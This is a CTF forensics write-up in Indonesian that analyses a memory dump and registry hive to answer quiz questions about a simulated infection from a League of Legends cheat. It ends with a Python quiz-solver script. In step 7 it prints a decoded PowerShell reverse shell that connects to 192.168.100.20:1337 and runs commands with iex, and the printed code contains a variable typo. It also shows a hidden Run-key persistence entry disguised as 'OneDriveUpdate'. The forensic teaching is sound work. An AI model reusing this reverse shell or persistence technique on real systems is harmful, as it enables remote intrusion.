# Writeup: League of the Legend (Forensics)

Tantangan forensics ini mensimulasikan skenario di mana laptop seorang korban terinfeksi malware setelah menginstal cheat game League of Legends (LOL). Kita diberikan sebuah memory dump (`memdump.mem`) dan registry hive user (`NTUSER.DAT`) untuk dianalisis.

Tantangan diselesaikan dengan menjawab serangkaian pertanyaan melalui kuis interaktif di `nc 10.0.2.15 4453`.

---

## 🔍 Analisis Langkah demi Langkah

### 1. Nama Hostname Korban
* **Pertanyaan**: Apa nama hostname dari komputer korban?
* **Penyelesaian**: 
  Kita dapat mencari nama hostname (`COMPUTERNAME`) langsung di dalam memory dump (`memdump.mem`). Melalui pencarian string mentah byte environment variable `COMPUTERNAME=`, kita menemukan:
  ```text
  COMPUTERNAME=DESKTOP-JU4Q97A
  ```
* **Jawaban**: `DESKTOP-JU4Q97A`

---

### 2. PID Proses PowerShell C2
* **Pertanyaan**: Berapa PID dari powershell yang digunakan temannya untuk membuat koneksi c2?
* **Penyelesaian**:
  Gunakan plugin `windows.netscan` pada Volatility3 untuk melihat seluruh koneksi jaringan yang aktif:
  ```bash
  vol -f memdump/memdump.mem windows.netscan
  ```
  Di dalam output, ditemukan koneksi keluar mencurigakan ke port `1337` (port umum shell):
  ```text
  0x948ec777db50   TCPv4   192.168.100.10:55738   192.168.100.20:1337   ESTABLISHED   5032   powershell.exe
  ```
* **Jawaban**: `5032`

---

### 3. Parent PID dari PowerShell C2
* **Pertanyaan**: Berapa Parent PID dari proses PowerShell mencurigakan yang terhubung ke C2?
* **Penyelesaian**:
  Gunakan plugin `windows.pslist` atau `windows.pstree` untuk melihat hierarki proses:
  ```bash
  vol -f memdump/memdump.mem windows.pslist
  ```
  Ditemukan proses powershell `5032` memiliki Parent PID (PPID) `7420`:
  ```text
  PID    PPID   ImageFileName
  5032   7420   powershell.exe
  ```
* **Jawaban**: `7420`

---

### 4. IP:PORT Server C2
* **Pertanyaan**: Apa IP:PORT server C2 yang terhubung dengan proses PowerShell mencurigakan?
* **Penyelesaian**:
  Berdasarkan data koneksi jaringan pada langkah kedua, alamat C2 adalah:
* **Jawaban**: `192.168.100.20:1337`

---

### 5. Argumen Penyembunyian Window PowerShell
* **Pertanyaan**: Kenapa proses powershell tidak nampak di layar utama desktop, apa argumen yang dia gunakan?
* **Penyelesaian**:
  Dengan membaca registry persistence atau memindai command line di memori, kita menemukan command line execution:
  ```text
  powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...
  ```
  Argumen khusus yang digunakan untuk menyembunyikan window PowerShell agar tidak muncul di desktop adalah:
* **Jawaban**: `-WindowStyle Hidden` *(Catatan: bersifat Case-Sensitive)*

---

### 6. Registry Path untuk Persistence
* **Pertanyaan**: Apa full registry path yang digunakan untuk persistence?
* **Penyelesaian**:
  Analisis file `NTUSER.DAT` menggunakan library `python-registry` atau registry viewer pada key autorun/startup (`Software\Microsoft\Windows\CurrentVersion\Run`).
  Ditemukan entri berikut:
  - **Key**: `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
  - **Value**: `OneDriveUpdate`
  - **Data**: `powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...`
* **Jawaban**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate`

---

### 7. Perintah Eksekusi Input C2
* **Pertanyaan**: Command apa yang mengeksekusi input dari C2 pada payload?
* **Penyelesaian**:
  Payload Base64 yang ditemukan di registry di-decode dari UTF-16LE:
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient("192.168.100.20",1337);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
      $sendback = (iex $data 2>&1 | Out-String);
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
      $stream.Flush()
  };
  $client.Close()
  ```
  Perintah yang mengeksekusi string `$data` (input dari C2) secara dinamis adalah `iex` (singkatan dari `Invoke-Expression`).
* **Jawaban**: `iex`

---

### 8. Variabel Network Stream Koneksi C2
* **Pertanyaan**: Variabel apa yang menyimpan network stream dari koneksi C2?
* **Penyelesaian**:
  Berdasarkan dekompilasi script di atas, variabel yang memegang network stream hasil dari `$client.GetStream()` adalah:
* **Jawaban**: `$stream`

---

## 🛠️ Lampiran: Script Otomatisasi Solver (`autopwn.py`)

Kita bisa menggunakan script python berikut untuk otomatis menjawab kuis interaktif secara instan:

```python
import socket
import time

s = socket.socket()
s.connect(('10.0.2.15', 4453))

# Membaca greeting awal
time.sleep(0.2)
print(s.recv(4096).decode())

# 1. Tekan ENTER untuk mulai
s.sendall(b"\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 2. Kirim Hostname
s.sendall(b"DESKTOP-JU4Q97A\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 3. Kirim PID
s.sendall(b"5032\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 4. Kirim PPID
s.sendall(b"7420\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 5. Kirim C2 IP:PORT
s.sendall(b"192.168.100.20:1337\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 6. Kirim Hiding Argument
s.sendall(b"-WindowStyle Hidden\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 7. Kirim Registry Path
s.sendall(b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 8. Kirim Command Executor
s.sendall(b"iex\n")
time.sleep(0.2)
print(s.recv(4096).decode())

# 9. Kirim Stream Variable
s.sendall(b"$stream\n")
time.sleep(0.5)
print(s.recv(4096).decode('utf-8', errors='replace'))

s.close()
```
